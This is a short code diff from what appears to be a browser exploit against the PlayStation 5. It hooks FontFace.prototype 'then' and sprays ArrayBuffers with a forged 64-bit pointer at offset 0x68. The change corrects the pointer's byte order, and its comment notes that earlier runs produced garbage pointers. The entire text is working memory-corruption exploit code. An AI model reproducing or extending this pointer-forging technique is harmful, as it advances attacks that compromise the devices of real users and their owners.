@@ -140,8 +140,15 @@ Object.defineProperty(FontFace.prototype,'then',{
       var ab=new ArrayBuffer(192);
       var v=new Uint8Array(ab);
       if(!primeMode){
+        // BYTE-ORDER FIX: PS5 is little-endian — the qword the engine reads
+        // at +0x68 is memory bytes 0x68..0x6f ascending (LSB first). hx is
+        // an MSB-first value string, so write it from the END. Earlier runs
+        // byte-reversed every forge (non-canonical garbage pointers): the
+        // p685 "7/7 die" rows and every content conclusion built on those
+        // forges are scheduled for re-measurement.
+        for(var c=0;c<0x68;c++)v[c]=0;
         var hx=forgeVal;
-        for(var b=0;b<8;b++)v[0x68+b]=parseInt(hx.substr(b*2,2),16);
+        for(var b=0;b<8;b++)v[0x68+b]=parseInt(hx.substr(16-2*(b+1),2),16);
       }
       map.push({ab:ab,view:v});
     }
